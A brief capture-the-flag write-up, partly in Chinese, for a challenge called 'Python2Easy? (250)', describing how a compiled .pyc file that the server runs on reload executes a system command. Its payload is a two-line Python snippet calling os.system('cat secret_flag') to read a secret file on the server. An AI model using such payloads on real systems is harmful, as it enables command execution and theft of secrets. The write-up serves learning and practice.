## Python2Easy? (250)
Credits to my teammates
### solution
與上題相同，改為生成以下檔案的`.pyc`,server會在reload時執行system command
發現server上的`secret_flag`並取得

```python
import os
key = os.system('cat secret_flag')
```
